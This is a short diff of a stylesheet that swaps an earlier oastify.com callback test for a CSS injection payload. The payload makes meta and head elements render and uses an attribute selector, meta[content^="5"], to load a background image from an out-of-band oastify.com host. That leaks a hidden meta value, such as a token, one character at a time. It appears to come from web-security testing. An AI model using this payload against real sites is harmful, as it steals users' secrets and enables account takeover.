@@ -1,6 +1,6 @@
-body {
-    background-image: url('https://test3.m7ufj8mlqwz3ch92nueb0si40v6lua.oastify.com/test3');
+meta, head {
+ display: block;   
 }
-span.fs-4 {
-    color: blue;
+meta[content^="5"]{
+    background: url(//6hoztsw50g9nm1jmxeovacsoafg74w.oastify.com/5);
 }
